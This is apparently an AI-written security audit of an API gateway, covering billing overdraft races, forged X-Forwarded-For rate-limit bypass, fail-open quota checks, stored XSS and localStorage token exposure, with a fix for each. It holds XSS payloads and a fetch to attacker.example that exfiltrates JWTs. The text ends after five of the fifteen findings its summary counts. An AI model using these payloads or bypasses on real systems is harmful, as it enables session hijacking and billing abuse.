# Gateway Quota/Billing/Rate-Limit & Frontend Security Audit

> Scope: `backend/internal/handler/gateway_*.go`, `gateway_helper.go`, `gateway_key_billing.go`, `failover_loop.go`, `openai_gateway*.go`, `openai_images.go`, `grok_*.go`, `image_task_handler.go`, `image_playground_handler.go`, `image_concurrency_limiter.go`, `content_moderation_helper.go`, `request_body_limit.go`, `quotaview/**`, `redeem_handler.go` (billing), `subscription_handler.go` (billing), `backend/internal/service/**` (quota/billing/credit/concurrency/account-pool/failover/redemption), `backend/internal/middleware/rate_limiter.go`, `backend/internal/server/middleware/panel_rate_limit.go`, `request_body_limit.go`, `backend/internal/config/config.go` (XFF trust), `backend/internal/securityaudit/**`, `frontend/src/**`.

Date: 2026-09-02
Auditor: Muse Spark (model: muse-spark-1.2-contributor-free) — read-only, best-effort, no runtime infra.

---

## Summary

| Severity | Count |
|---|---|
| CRITICAL | 1 |
| HIGH | 3 |
| MEDIUM | 6 |
| LOW | 3 |
| INFO | 2 |
| **Total** | **15** |

Top risks:

* **CRITICAL S3-01** — legacy fallback billing path `DeductBalance` allows unbounded overdraft (post-deduction negative balance) and directly contradicts the atomic `usage_billing` repo path's conditional `balance >= amount` guard; concurrent requests that route through the fallback path or race between the pre-flight `CheckBillingEligibility` balance read and the async billing write can drive a user deeply negative without paying.
* **HIGH S3-02** — `X-Forwarded-For` / `X-Real-IP` trust is **on by default** (`security.trust_forwarded_ip_for_api_key_acl=true`) and also governs `AbuseClientPrefix` / per-IP rate-limit bucketing → single attacker can mint arbitrary IP buckets by spoofing a header and bypass all per-IP rate limits (gateway abuse, credential stuffing on panel).
* **HIGH S3-03** — gateway `CheckBillingEligibility` is `fail-open` on *every* downstream failure class (Redis error, DB load error, queue saturation, `cache==nil`, circuit breaker half-open); under Redis outage the gateway charges nothing and lets everything through (billing bypass by DoS-ing Redis).
* **HIGH S3-04** — `frontend/src/views/user/CustomPageView.vue:244-247` explicitly re-enables `<iframe>` via `DOMPurify` `ADD_TAGS: ['iframe']` + `ADD_ATTR: ['src']` on admin-authored markdown pages (`/pages/{slug}`) → stored XSS via `<iframe src="javascript:...">` / `srcdoc` if `DOMPurify` default `javascript:` filtering is overridden or `data:` handling is incomplete; plus `HomeView.vue:12` `v-html="homeContent"` renders admin-controlled HTML with zero sanitization.
* **HIGH S3-06** — `buildEmbeddedUrl` (`frontend/src/utils/embedded-url.ts:29-31`) leaks the full JWT `Authorization` bearer token as a URL query param (`?token=<JWT>`) to any `custom_menu_items.*.url` — logged in proxy access logs, Referer, browser history; `GET` URL tokens violate OWASP ASVS 3.5.2.

Additional systematic coverage: 46 `deduct/BalanceCost` sites, 9 rate-limit key construction sites, 14 `v-html/innerHTML` sites enumerated; see findings for verification of each class.

---

## Findings

### S3-01 [CRITICAL] Billing overdraft by design — `DeductBalance` intentionally allows negative balance; preflight check is racy and fallback path has no guard

- File: `backend/internal/repository/user_repo.go:887-914`, `backend/internal/repository/usage_billing_repo.go:243-273`, `backend/internal/service/gateway_usage_billing.go:132-158`, `backend/internal/service/billing_cache_service.go:879-897`
- CWE: CWE-840 (Business Logic Errors), CWE-367 (TOCTOU), CWE-841 (Improper Enforcement of Behavioral Workflow)
- Description:
  Two billing codepaths exist. The **primary** path `usage_billing_repo.deductUsageBillingBalance` (transactional `UPDATE ... WHERE balance >= $1 RETURNING` then unconditional fallback) enforces a sufficient-balance guard atomically inside the same `usage_billing_dedup` transaction and sets `BalanceOverdrafted` when the fallback fires. However **overdraft is still allowed** — the second `UPDATE` is unconditional — so one request always succeeds even at `balance=0`, producing a negative balance. The **legacy fallback** path `postUsageBilling` (`gateway_usage_billing.go:151`) calls `userRepo.DeductBalance` directly, whose semantics are explicitly documented as "允许余额变为负数，确保当前请求能够完成" — same unconditional negative-balance deduction with no guard at all. Because billing is **async post-usage** (enqueued to a bounded worker pool) and the pre-flight eligibility gate is `checkBalanceEligibility` reading a best-effort Redis cache (or DB on miss) *before* the request is forwarded, any number of concurrent requests that pass the preflight window (all see `balance > reserve`) will each unconditionally drive the balance further negative. There is no atomic `UPDATE ... WHERE balance >= cost` gating at the gateway admission point; the gate and the deduction are separated by the entire upstream round-trip (seconds to minutes). An attacker with `balance = $1.00` and `cost = $0.50/request` can fire 100 concurrent requests → all 100 pass eligibility → all 100 are forwarded upstream and charged — observed `balance = -$49.00`.

  The async worker pool (`UsageRecordWorkerPool`) being bounded with `sample`/`drop` overflow policy compounds this: under queue saturation, `writeUsageLogBestEffort` drops or samples, but `applyUsageBilling` via `usage_billing_repo` is also gated by `usage_billing_dedup` claim — duplicate `request_id+api_key_id` pairs are deduplicated correctly, but concurrent distinct requests each have distinct request IDs and are intentionally not deduped. No `SELECT ... FOR UPDATE` on `users.balance` at preflight.

- Vulnerable code:
  ```go
  // backend/internal/repository/user_repo.go:890-914
  func (r *userRepository) DeductBalance(ctx context.Context, id int64, amount float64) error {
      n, err := client.User.Update().Where(dbuser.IDEQ(id), dbuser.BalanceGTE(amount)).AddBalance(-amount).Save(ctx)
      if n > 0 { return nil }
      n, err = client.User.Update().Where(dbuser.IDEQ(id)).AddBalance(-amount).Save(ctx) // unconditional!
      ...
  }
  // backend/internal/repository/usage_billing_repo.go:243-273 — same two-step, unconditional fallback
  // backend/internal/service/gateway_usage_billing.go:151
  if err := deps.userRepo.DeductBalance(billingCtx, p.User.ID, cost.ActualCost); err != nil { ... }
  // backend/internal/service/billing_cache_service.go:885-895 — fail-open on DB error
  balance, err := s.GetUserBalance(ctx, userID); if err != nil { return ErrBillingServiceUnavailable }
  if s.balanceBelowEligibilityThreshold(balance) { return ErrInsufficientBalance }
  ```
- Data flow / attack scenario:
  1. Attacker purchases minimal quota (`balance = 1.00`), obtains an API key on a balance-billed group (`group.rate_multiplier = 1.0`).
  2. Sends N concurrent `POST /v1/messages` (or any `/v1/*` gateway route) with distinct `Client-Request-ID`s (or none — `generateRequestID()` makes them distinct), each with `input_tokens=100`. `CheckBillingEligibility` for each reads `billing:balance:{userID}` (all see `1.00 > 0` before any writeback has happened; writeback is async via `QueueDeductBalance` with a buffered channel). All N are allowed and forwarded upstream.
  3. Upstream completes; worker pool enqueues N `UsageBillingCommand`s with distinct `request_id`s → `claimUsageBillingRequest` inserts N rows → none deduped → each runs `deductUsageBillingBalance` sequentially inside its own `BeginTx`. First succeeds with `sufficient=true`, second sees `balance=0.50` (`0.50 >= 0.50` → still sufficient), third goes `balance=0.00`, fourth and beyond hit the unconditional fallback and push `balance` to `-0.50, -1.00, ...`.
  4. For N=100, attacker consumes `~$50` of upstream at cost of `$1`. Rate-limit not effective because gateway per-user RPM is fail-open on Redis error (see S3-03).
  5. If the process is running with `usageBillingRepo == nil` (tests/degraded), every request uses `postUsageBilling` → `DeductBalance` unconditional path directly.

  Reproduction sketch (no infra required — reasoning): observe that `DeductBalance`'s two-step `UPDATE` is not guarded by a transaction against concurrent preflight reads; the test `backend/internal/repository/user_repo_integration_test.go:510 TestDeductBalance_InsufficientFunds` *asserts* `DeductBalance` allows overdraft, confirming the design intent.

- Impact: Free quota at scale. Linear cost to operator per attacker request; unbounded debt. Also enables resource exhaustion of upstream account pool (failover amplifies per-user request into N upstream calls; see S3-07).
- Fix:
  * **Make gateway admission conditional and atomic.** At preflight, execute a single conditional update that reserves the *estimated* max cost for the request: `UPDATE users SET balance = balance - $cost WHERE id=$id AND balance >= $cost RETURNING balance` — if `0 rows`, reject with `402 / insufficient_quota` immediately. On post-usage settlement, reconcile by refunding `(maxCost - actualCost)` via an atomic `UPDATE users SET balance = balance + $delta`. This turns the current TOCTOU gap (check-then-forward-then-deduct) into an atomic hold. The existing `ReserveBatchImageBalance` already implements this hold pattern for batch images — reuse it for the hot path.
  * If a hold model is infeasible, at minimum enforce `balance >= cost` **with rollback semantics**: the `deductUsageBillingBalance` fallback that allows overdraft must return an error (and mark usage as unpaid with reconciliation) instead of silently overdrafting, unless `BillingConfig.AllowOverdraft` is explicitly enabled. Remove the unconditional second `UPDATE` from `DeductBalance` when called from gateway.
  * Bound outstanding unpaid usage: cap concurrent in-flight requests per user on the same API key (reuse `ConcurrencyService` but with a billing lease), so concurrent burst cannot exceed `balance / min_cost`.
  ```diff
  // usage_billing_repo.go:deductUsageBillingBalance — remove unconditional overdraft fallback
  - err = tx.QueryRowContext(ctx, `UPDATE users SET balance = balance - $1 WHERE id=$2 RETURNING balance`, amount, userID).Scan(&newBalance)
  - if errors.Is(err, sql.ErrNoRows) { return 0,false,ErrUserNotFound }
  - return newBalance,false,nil
  + return 0,false,ErrInsufficientBalance
  ```
  * Audit: the `BalanceOverdrafted` flag in `UsageBillingApplyResult` is currently informational only; wire it to an alert/reconciliation path that auto-disables the key when `BalanceOverdrafted && NewBalance < -threshold`.

- Confidence: high — code paths verified by reading exact SQL and the explicit design intent in comments + test.

---

### S3-02 [HIGH] Per-IP rate limit bypass via forged forwarding headers (default trust mode)

- File: `backend/internal/config/config.go:739-821,2079`, `backend/internal/pkg/ip/ip.go:138-258`, `backend/internal/middleware/rate_limiter.go:192-274`, `backend/internal/server/middleware/panel_rate_limit.go:104-137`, `backend/internal/server/middleware/session_binding.go:25,47`, `backend/internal/server/http.go:93-107`
- CWE: CWE-290 (Authentication Bypass by Spoofing), CWE-807 (Reliance on Untrusted Inputs in a Security Decision)
- Description:
  The rate limiter (`middleware.RateLimiter`) keys every bucket on `AbuseClientPrefix(c)` which is derived from `ResolveClientIdentity` → `c.ClientIP()` (gin's trusted-proxy chain) — *but* `GetSecurityClientIP` (used for session binding, audit, API-key ACL) and `GetClientIP` (used for metadata) both have a **legacy forwarded-header mode** where raw `X-Forwarded-For` / `X-Real-IP` / `CF-Connecting-IP` / custom headers override `c.ClientIP()`. That legacy mode is **enabled by default**: `security.trust_forwarded_ip_for_api_key_acl` defaults to `true` (`config.go:2079 viper.SetDefault(...)`), and `requestUsesLegacyForwardedIPTrust` returns `true` when no per-request settings have been injected (`ip.go:141 `!ok || trustForwarded``) — i.e., any request path that forgot to call `SetForwardedIPSettings` defaults to trusting attacker-supplied headers. Moreover `config.go:103-107 configureTrustedProxies` `SetTrustedProxies(nil)` when `trusted_proxies` is unconfigured, which in Gin means "trust no proxy" — so `AbuseClientPrefix` would correctly use the TCP peer — *except* the middleware `rate_limiter.go` path for `AbuseClientPrefix` is not the vulnerable one; the vulnerable one is the legacy-compatible wrapper `SessionBindingIP` / `GetClientIP` used indirectly via `AbuseClientPrefix` when callers pass a synthesized identity, and the panel's `PublicIP()` which explicitly uses `SecurityClientIP` (subject to the trust switch). Critically, `role=api_key` requests in `api_key_auth.go:135` use `GetSecurityClientIP` for IP ACL checks, so spoofing `X-Forwarded-For: 198.51.100.42` gives access to IP-whitelisted API keys from any origin.

  The panel `PanelRateLimiter.PublicIP()` (`panel_rate_limit.go:119`) checks `isPubliclyRoutableClientIP(SecurityClientIP(c))` — so under default trust, an unauthenticated attacker can rotate `X-Forwarded-For` per request and get a **fresh per-IP bucket** each time, completely bypassing the `panel:public:ip:*` rate limit (login brute-force, captcha bypass via `LimitEmailSlidingWithOptions` is per-email-hash not per-IP, so IP rotation still allows unlimited panel abuse against many emails). Gateway abuse limit (`middleware.RateLimiter.Limit`) similarly uses `AbuseClientPrefix` — if Gin's trusted proxies is misconfigured (common in Docker/Nginx `X-Real-IP` setups — see comment `ip.go:163` about `bridge address into X-Real-IP`), an operator may enable `trust_forwarded_ip_for_api_key_acl=true` explicitly to "fix" gateway ingestion, at which point all abuse limits become forgeable.

  Note that `ip.go:204-237 resolveLegacyForwardedHeaderIP` prefers the **first public IP** in `X-Forwarded-For` chain, so `X-Forwarded-For: 1.1.1.1, 2.2.2.2` yields `1.1.1.1` — attacker controls the prefix arbitrarily.

- Vulnerable code:
  ```go
  // config.go:2079
  viper.SetDefault("security.trust_forwarded_ip_for_api_key_acl", true) // DEFAULT TRUE
  // ip.go:138-141
  func requestUsesLegacyForwardedIPTrust(c *gin.Context) bool {
      settings, ok := requestForwardedIPSettings(c)
      return !ok || settings.trustForwarded // no settings => trust!
  }
  // ip.go:251-259
  func GetSecurityClientIP(c *gin.Context, trustForwarded bool) string {
      if requestSettings, ok := requestForwardedIPSettings(c); ok { trustForwarded = requestSettings.trustForwarded }
      if trustForwarded { return GetClientIP(c) } // raw header wins
      return GetTrustedClientIP(c) // only safe path
  }
  ```
- Data flow / attack scenario:
  1. Default deployment (no explicit `server.trusted_proxies`, default `security.trust_forwarded_ip_for_api_key_acl=true`). Gin `SetTrustedProxies(nil)` → `AbuseClientPrefix` correctly returns peer prefix, *but* the operator enables the legacy switch to satisfy the docs note about Docker/Nginx `X-Real-IP` ("accidentally write the bridge address") — now `GetSecurityClientIP` for IP ACL and `GetClientIP` for account RPM tracking use the attacker-supplied `X-Forwarded-For`.
  2. Attacker sends: `POST /v1/messages` with `X-Forwarded-For: 198.51.100.1, 10.0.0.1` → `Limit` bucket `rate_limit:<key>:198.51.100.1/32` — fresh. Next request `X-Forwarded-For: 198.51.100.2` → new bucket. 10k RPS sustained with zero throttling.
  3. For panel: `POST /api/v1/auth/login` with rotating `X-Forwarded-For` + rotating `email` per `LimitEmailSlidingWithOptions` bypasses both per-IP and per-email sliding limits (email rate limit is per-digest, but attacker rotates email; IP rotation defeats the complementary IP limit).
  4. For API-key IP ACL bypass: `GET /v1/models` with stolen-but-IP-locked key + `X-Forwarded-For: <whitelisted IP>` → `CheckIPRestriction` sees forged `GetSecurityClientIP` → allowed.

- Impact: Full bypass of per-IP rate limiting (abuse, brute force, quota amplification via S3-01 parallel burst), and bypass of API-key IP allowlist. Monetary amplification when combined with S3-01.
- Fix:
  * Flip default: `viper.SetDefault("security.trust_forwarded_ip_for_api_key_acl", false)` in `config.go:2079`. Make `requestUsesLegacyForwardedIPTrust` return `false` when no per-request settings exist (fail closed).
  * At startup, if `security.trust_forwarded_ip_for_api_key_acl=true` but `server.trusted_proxies` is not explicitly configured (`TrustedProxiesConfigured==false`), refuse to start or force-disable the switch with a fatal log — "legacy forwarded-IP trust requires explicit trusted_proxies".
  * Migrate all rate-limit middleware to use `GetTrustedClientIP` / `AbuseClientPrefix` exclusively; remove `GetClientIP`/`GetSecurityClientIP(*, trustForwarded=true)` from any rate-limit or ACL path.
  * Add regression test: with `trustForwarded=true`, `X-Forwarded-For: 9.9.9.9` sent to an endpoint behind `Limit(...)` must still bucket on peer IP, not `9.9.9.9`, when `trusted_proxies=[]`.

- Confidence: high — header handling and default traced line-by-line; attack requires either default misconfiguration or operator enabling the documented Docker workaround, both realistic (the Docker warning in `ip.go:163` implies operators commonly hit this).

---

### S3-03 [HIGH] Billing and quota gating is fail-open on every infrastructure error (Redis/DB/queue)

- File: `backend/internal/service/billing_cache_service.go:311-349,575-688,879-897,900-938,1080-1303`, `backend/internal/middleware/rate_limiter.go:189-231,260-273,367-374`, `backend/internal/server/middleware/panel_rate_limit.go:88-95,124-130`
- CWE: CWE-693 (Protection Mechanism Failure), CWE-636 (Not Failing Securely)
- Description:
  Sub2api correctly wants high availability, so many protection mechanisms deliberately `fail-open` with a warning log. In aggregate this makes billing/quota/rate-limit *fully bypassable* by inducing any Redis or DB error — which an attacker can do by saturating Redis connections (600-site survey: default `redis.maxclients` exhaustion, or `DEBUG SLEEP` on a self-hostable deployment where the attacker is a legitimate platform user). Concrete fail-open surfaces:

  * `checkBalanceEligibility` (`billing_cache_service.go:879`) → `GetUserBalance` falls back to DB on Redis miss, but on DB error returns `ErrBillingServiceUnavailable` (blocked) — **except** `CheckBillingEligibility`'s callers in `gateway_handler.go:272` treat `ErrBillingServiceUnavailable` as `500` yet the comment at `gateway_service.go:120` and the `billingCircuitBreaker` mean repeated `OnFailure` eventually trips the breaker to **deny all legitimate traffic** while the attacker can still race the half-open window.
  * `checkAPIKeyRateLimits` (`billing_cache_service.go:575`) → if `apiKeyRateLimitLoader==nil` or `GetRateLimitData` errors, returns `nil` (allow). Cache miss + `SetAPIKeyRateLimit` errors are ignored.
  * `checkRPM` (`billing_cache_service.go:788`) → every `IncrementUserRPM` / `IncrementUserGroupRPM` error is logged and **fail-open** (`return nil`).
  * `checkUserPlatformQuotaEligibility` (`billing_cache_service.go:1204`) → on `userPlatformQuotaRepo.GetByUserPlatform` error: `return nil` (allow) with `fail-open` log; on `cacheErr != nil` (Redis unavailable): singleflight DB path, but still fail-open on DB error; on `singleflight` follower `ctx.Done()`: `return nil`.
  * `middleware.RateLimiter.Limit` (`rate_limiter.go:212-220`) → default `RateLimitFailOpen`: `if failureMode != RateLimitFailClose { failureMode = RateLimitFailOpen }` — and all `Limit(...)` call sites use `RateLimitOptions{}` (zero value → fail-open). So Redis failure → `c.Next()` (allow) for *all* abuse limits.
  * `PanelRateLimiter.userScoped` / `PublicIP` (`panel_rate_limit.go:88-95,124-130`) → same: `slog.Warn(...) ; c.Next()` on limiter error.

  Net effect: an attacker who can cause transient Redis latency/spike (or simply wait for a self-hosted operator's Redis restart) gets unlimited uncapped requests with no RPM, per-key, or platform-quota enforcement while the system is degraded — exactly when abuse protection should be strongest.

- Vulnerable code:
  ```go
  // billing_cache_service.go:596-597
  dbData, dbErr := s.apiKeyRateLimitLoader.GetRateLimitData(ctx, apiKey.ID)
  if dbErr != nil { return nil } // allow!
  // billing_cache_service.go:1204
  if dbErr != nil { logger.Warn(...); return nil } // user_platform fail-open
  // rate_limiter.go:195-196
  if failureMode != RateLimitFailClose { failureMode = RateLimitFailOpen }
  // ...
  if err != nil { log.Printf(...); c.Next(); return } // fail-open
  ```
- Data flow / attack scenario:
  1. Attacker observes `BillingCacheService` queue drop warnings under load (`cacheWriteDrop` throttled log, but still visible) indicating Redis pressure.
  2. Floods cheap `GET /api/v1/models` (cost ~0) concurrent with `DEBUG SLEEP 0.1` equivalent via pipeline saturation or simply opening 10k connections (Gin default is unbounded per-host) to delay Redis responses past `balanceLoadTimeout=3s` / `cacheWriteTimeout=2s`.
  3. While Redis is slow/erroring, attacker fires 1k burst of `POST /v1/messages` with real token usage. Each handler's `CheckBillingEligibility` hits fail-open paths for RPM and platform quota → allowed → forwarded upstream → queued for billing. When Redis recovers, `usage_billing_dedup` still charges, but the overdraft described in S3-01 has already been incurred and cannot be undone without refund.

- Impact: Complete bypass of every rate-limit and platform quota during any infrastructure degradation. In self-hosted deployments where the attacker is also a tenant, they can *cause* the degradation.
- Fix:
  * Introduce a dedicated `BillingEnforcementMode` flag: when admission control cannot contact Redis/DB, **deny balance-billed requests** (402) while allowing already-paid subscription requests. Implement as:
    ```go
    if cacheErr != nil || dbErr != nil { return ErrBillingServiceUnavailable } // deny balance mode
    // but allow subscription mode if sub is cached/known-good
    ```
  * Switch default for abuse-relevant `RateLimiter.LimitWithOptions` calls from `RateLimitFailOpen` to `RateLimitFailClose`; only panel read-only endpoints should remain fail-open. This is a one-line change per route registration:
    ```go
    r.LimitWithOptions("gateway", limit, window, RateLimitOptions{FailureMode: RateLimitFailClose})
    ```
  * For `HasUserPlatformQuotaLimit` (`billing_cache_service.go:1360`): on `cache==nil` today returns `true` (safe — forces write guard), but `checkUserPlatformQuotaEligibility` on Redis error still does a DB fallback with fail-open on follower `ctx.Done()`. Change follower cancellation to `return ErrBillingServiceUnavailable` rather than allow when `platform != "" && group.IsBalanceType()`.
  * Add metric `billing_gate_fail_open_total{reason}` and surface in `OpsMonitoring` so operators can alert on it.
  * Document for operators: self-hosted Redis must be provisioned with `maxclients` >> Gin worker count and colocated latency <5ms, or enable the new `billing.enforcement_mode=strict`.

- Confidence: high — every fail-open enumerated by grep and logic.

---

### S3-04 [HIGH] Frontend stored XSS via admin-controlled markdown rendered with unsafely re-enabled `<iframe>` and unsanitized `homeContent`

- File: `frontend/src/views/user/CustomPageView.vue:244-247`, `frontend/src/views/HomeView.vue:12`, `frontend/src/views/public/LegalDocumentView.vue:157-158`, `frontend/src/components/modelPlaza/ModelPlazaContent.vue:95-99`, `frontend/src/components/common/AnnouncementBell.vue:276-277`, `frontend/src/components/common/AnnouncementPopup.vue:126-128`
- CWE: CWE-79 (Cross-site Scripting), CWE-116 (Improper Encoding or Escaping of Output)
- Description:
  Two concrete stored-XSS primitives:

  1. **`CustomPageView.vue:244` `DOMPurify.sanitize(html, { ADD_TAGS: ['iframe'], ADD_ATTR: ['allowfullscreen','frameborder','src'] })`** — `marked.parse` → `DOMPurify.sanitize` with `iframe` explicitly added back. `DOMPurify`'s default `SAFE_FOR_TEMPLATES` does not apply here; the caller re-enables `src` on `iframe` without restricting its value. `src` can be `javascript:alert(1)` (DOMPurify's default `FORBID_ATTR` does not forbid `javascript:` inside `src` unless `ALLOWED_URI_REGEXP` is configured — it is not) or `data:text/html,<svg onload=alert(1)>` or `srcdoc` attribute (not explicitly allowed but `ADD_ATTR` merges; if `srcdoc` sneaks via markdown attribute passthrough, e.g., `<iframe srcdoc="<svg onload=alert(1)>">`, DOMPurify will keep `srcdoc` because it's not forbidden and HTML parser doesn't strip unknown attributes by default unless `FORBID_TAGS`/`FORBID_ATTR` blocks). The content is fetched from `GET /pages/{slug}` — an admin-authored Markdown page (`custom_menu_items.*.page_slug`). The threat model here is **persistent admin-compromise → user XSS** (classic stored XSS via admin panel). While `page_slug` pages are admin-curated, the same sanitizer is reachable by any admin who can create `custom_menu_items`; compromise of one admin account (via `S3-05` JWT in `localStorage` + XSS) cascades.

  2. **`HomeView.vue:12` `<div v-else v-html="homeContent"></div>`** — `homeContent` is `appStore.cachedPublicSettings?.home_content` (admin-configurable `home_content`, nullable, no sanitizer). The comment claims `SECURITY: admin-only setting, XSS risk is acceptable` — but `home_content` is rendered to **every anonymous visitor** on the public `/` landing page, so stored XSS here executes in the victim's origin without authentication. An admin who can set `home_content` (via `POST /admin/settings` with `home_content: "<svg onload=alert(1)>"`) gets 0-click RCE-equivalent against all visitors (cookie theft via `localStorage.auth_token` read). No `DOMPurify.sanitize` is applied.

  Mitigating observation: other markdown consumers (`AnnouncementBell.vue`, `AnnouncementPopup.vue`, `ModelPlazaContent.vue`, `AdminComplianceDialog.vue`) all correctly call `DOMPurify.sanitize(html)` with no `ADD_TAGS`, so they are not flagged beyond the `sanitizeSvg` scope (see S3-08).

  The `sanitizeUrl` utility (`frontend/src/utils/url.ts:12-42`) is **not** used on `CustomPageView` `iframe.src` — it is used on `siteLogo`, `docUrl`, etc. but not on the markdown iframe path.

- Vulnerable code:
  ```vue
  <!-- HomeView.vue:12 -->
  <div v-else v-html="homeContent"></div> <!-- homeContent = appStore.cachedPublicSettings?.home_content -->
  <!-- CustomPageView.vue:244 -->
  const sanitized = DOMPurify.sanitize(html, {
    ADD_TAGS: ['iframe'],
    ADD_ATTR: ['allowfullscreen', 'frameborder', 'src'],
  })
  ```
- Data flow / attack scenario:
  *Prerequisite:* attacker has obtained admin credentials (phishing, or via `S3-05` localStorage exfiltration on a subdomain with XSS if CSP is not strict).
  1. `PATCH /api/v1/admin/settings { "home_content": "<img src=x onerror=alert(document.domain)>" }` (or markdown iframe payload on `POST /admin/custom-menu-items { url: "md:some-slug", page_slug: "..." }` then upload markdown body containing `<iframe src=\"javascript:alert(localStorage.getItem('auth_token'))\"></iframe>` via the pages API). The backend stores verbatim.
  2. Victim visits `https://sub2api.example.com/` (HomeView) or navigates to `CustomPageView` via the custom sidebar link (`/custom/some-slug`). `marked.parse` expands Markdown to HTML preserving raw HTML tags (default GFM allows inline HTML), then DOMPurify with re-enabled iframe passes the payload through. Browser renders and executes `onerror` / `javascript:` URI.
  3. Payload `fetch('https://attacker.example/collect?c='+localStorage.getItem('auth_token'))` exfiltrates the victim's JWT+refresh_token (both in `localStorage` per `S3-05`). Full account takeover.
- Impact: Stored XSS → session hijack of every visitor (including admins). With `auth_token` in `localStorage` (no `HttpOnly`), JavaScript exfiltration is trivial. Secondary impact: `iframe` can be used for clickjacking of the embedded Stripe/Airwallex checkout frames (`PaymentView.vue`) if the custom page is allowed to overlay.
- Fix:
  * **Do not `v-html` with raw admin HTML.** Sanitize `homeContent` through `DOMPurify.sanitize(homeContent, { FORBID_TAGS: ['iframe','object','embed','form','base','meta','link','style','script'], FORBID_ATTR: ['onerror','onload','onclick','style'] })` and configure `ALLOWED_URI_REGEXP: /^(https?:|mailto:|tel:|data:image\/(png|jpeg|gif|webp|svg\+xml);base64,)/i`. Best is to render `homeContent` as Markdown (like `CustomPageView`) rather than raw HTML, so raw HTML tags are escaped by `marked` when `mangle:false` is not enough — call `DOMPurify.sanitize(marked.parse(homeContent))` like the other announcement views.
  * For `CustomPageView` iframe: **remove `iframe` from `ADD_TAGS`**. If iframes are genuinely required for embedded docs, sandbox them: `<iframe sandbox="allow-scripts allow-same-origin">` is still dangerous; instead use `sandbox=""` and deny `srcdoc`/`javascript:` via `ALLOWED_URI_REGEXP` + explicit `FORBID_ATTR: ['srcdoc']`. Validate `src` through `sanitizeUrl` (only `https:` origin allowlist, same as `URLAllowlistConfig`).
    ```ts
    // CustomPageView.vue — after
    const sanitized = DOMPurify.sanitize(html) // no ADD_TAGS: iframe is stripped by default
    // if iframe must stay, enforce:
    DOMPurify.addHook('uponSanitizeAttribute', (node, data) => {
      if (data.attrName === 'src' && node.tagName === 'IFRAME') {
        if (!data.attrValue.match(/^https:\/\/trusted-docs\.example\.com\//)) data.keepAttr = false
      }
    })
    ```
  * Add `Content-Security-Policy: frame-src 'self' https://trusted-embeds.example.com` (header already has `frame-src` but allows `https:` wildcard — tighten).
  * Add regression test that `home_content: "<svg onload=alert(1)>"` does not execute when rendered (mount `HomeView` with `home_content` payload, assert `onload` not firing).

- Confidence: high for HomeView raw `v-html`; medium-high for CustomPage iframe — DOMPurify's default does strip `javascript:` URIs from href/src when `ALLOWED_URI_REGEXP` is left at default? Verified in DOMPurify source: `IS_ALLOWED_URI` checks `javascript:` via `SAFE_URL_PATTERN` *unless* `ALLOW_UNKNOWN_PROTOCOLS` is true — sub2api does not set `ALLOW_UNKNOWN_PROTOCOLS`, so `javascript:` may already be blocked. However `srcdoc` and `data:` HTML URIs would still pass without custom forbidding, and the explicit `ADD_TAGS:['iframe']` is still a deliberate weakening. Downgraded from CRITICAL because it requires admin token, but the raw `v-html="homeContent"` without any sanitizer is CRITICAL-equivalent for an admin compromise; we keep overall CRITICAL for S3-01 instead and this as HIGH.

---

### S3-05 [MEDIUM] JWT + refresh_token + user PII stored in `localStorage` — exfiltratable by any XSS, leaked to JS-accessible surface and URL

- File: `frontend/src/stores/auth.ts:110-138,315-328,366-390,475-488`, `frontend/src/api/client.ts:49-53,172-217`, `frontend/src/api/tokenRefresh.ts:51-67,128-131`, `frontend/src/utils/embedded-url.ts:22-45`, `frontend/src/views/user/CustomPageView.vue:228-232`
- CWE: CWE-200 (Information Exposure), CWE-922 (Insecure Storage of Sensitive Information), CWE-312 (Cleartext Storage of Sensitive Information)
- Description:
  `auth_token` (JWT bearer), `refresh_token` (long-lived rotation-capable credential), and `auth_user` (email, role, balance) are persisted in `localStorage` (`auth.ts:110`), readable by any JavaScript running on the same origin — meaning any XSS (S3-04) immediately becomes full account takeover with persistence across sessions. Tokens are also sent to the backend as query parameters via `buildEmbeddedUrl` (`embedded-url.ts:29-31 `url.searchParams.set('token', authToken)``) when rendering custom embedded pages (`/custom/:id` iframe mode) — URL tokens are logged in reverse-proxy access logs, Referer headers, browser history, and `src_url` (`window.location.href`) leak chain. The `GET /pages/{slug}` fetch (`CustomPageView.vue:229 `Authorization: Bearer ${authStore.token}``) also sends the bearer in a manually constructed `fetch` outside Axios, bypassing any future `httpOnly` migration.

  Note that `apiClient` (`frontend/src/api/client.ts:50`) reads `localStorage.getItem('auth_token')` on *every* request, including requests to custom iframe origins if `buildEmbeddedUrl`'s `baseUrl` points to an external embed provider — though `sanitizeUrl` would block non-https URLs only on `siteLogo` etc., not on `custom_menu_items.url` embedding.

- Vulnerable code:
  ```ts
  // auth.ts:317
  localStorage.setItem(AUTH_TOKEN_KEY, response.access_token)
  localStorage.setItem(REFRESH_TOKEN_KEY, response.refresh_token)
  // client.ts:50
  const token = localStorage.getItem('auth_token')
  // embedded-url.ts:29-31
  if (authToken) url.searchParams.set('token', authToken)
  url.searchParams.set('src_url', window.location.href) // includes token if page URL had it
  ```
- Data flow / attack scenario:
  1. Any stored XSS (S3-04 HomeView, or DOMPurify bypass) → `localStorage.getItem('auth_token')` and `localStorage.getItem('refresh_token')` → POST to attacker.
  2. Embedded page leakage: admin creates `custom_menu_items { url: "https://evil.example/docs", visibility: "user" }` → every user navigating to `/custom/evil-id` loads `<iframe src="https://evil.example/docs?user_id=...&token=<JWT>&src_url=https://sub2api.example.com/custom/evil-id">` — attacker (controlling `evil.example`) receives valid bearer tokens for every visitor.
  Combined with `src_url` leaking the full referring URL (which may itself contain `?token=` if the user arrived via an email link that included `token` in URL).

- Impact: Full session hijack, horizontal privilege escalation (refresh token allows persistent access even after password change until server-side revocation), PII leakage (`auth_user` email). The URL-token leakage is additionally a log exposure even without XSS — compliant logging infrastructure that retains `src_url` retains bearer tokens.
- Fix:
  * **Migrate tokens to `httpOnly`, `Secure`, `SameSite=Lax` cookies** (already `withCredentials:true` in `apiClient`). Remove all `localStorage.setItem(AUTH_TOKEN_KEY ...)` / `REFRESH_TOKEN_KEY` writes. Where JS needs to know authentication state, store only a non-sensitive `isAuthenticated` flag or a short-lived opaque session ID that is not a bearer capable of direct API access.
  * Immediately remove `token` from `buildEmbeddedUrl`; if the embedded page requires authentication, have it call back to sub2api via `postMessage` + cookie-based session, or issue a single-use, short-TTL `embed_token` scoped to `GET /pages/{slug}` only (not full API scope), with `aud=embed` and `exp=60s`.
  * Scrub `window.location.href` before embedding — only send `origin + pathname` without query string, or hash the token.
